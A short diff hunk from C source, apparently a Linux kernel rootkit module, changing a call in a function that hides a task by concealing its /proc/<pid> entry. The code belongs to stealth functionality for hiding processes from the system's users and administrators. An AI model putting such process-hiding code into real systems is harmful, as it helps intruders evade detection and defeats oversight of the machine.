@@ -79,7 +79,7 @@ static int _hide_task(void *data) {
     /** hide /proc/<pid> */
     snprintf(pidnum, sizeof(pidnum), "%d",  node->task->pid);
     pidstr[0] = pidnum;
-    fs_add_name_rw(pidstr);
+    fs_add_name_rw(pidstr, 0);
 
     prinfo("hide [%p] %s : %d\n", ht->task, ht->task->comm, ht->task->pid);
 
